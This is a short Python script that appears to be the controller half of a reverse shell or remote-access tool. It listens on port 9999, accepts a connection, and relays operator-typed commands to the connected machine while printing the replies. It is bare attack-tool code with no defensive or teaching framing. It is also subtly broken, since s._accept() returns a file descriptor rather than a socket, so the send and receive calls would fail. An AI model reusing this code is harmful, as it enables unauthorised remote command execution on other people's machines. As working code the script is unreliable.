import socket
import sys


#create socket (allows you to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("socket error" + str(msg))


# Bind socket to port and wait for connection from client

def socket_bind():
    try:
        global host
        global port
        print("binding port to socket: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("socket binding error" + str(msg) + "\n retrying")
        socket_bind()


def socket_accept():
    conn, address = s._accept()
    print("connection has been stablished |" + "IP" + address[0] + "|port" + str(address[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if(len(str.encode(cmd))) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()
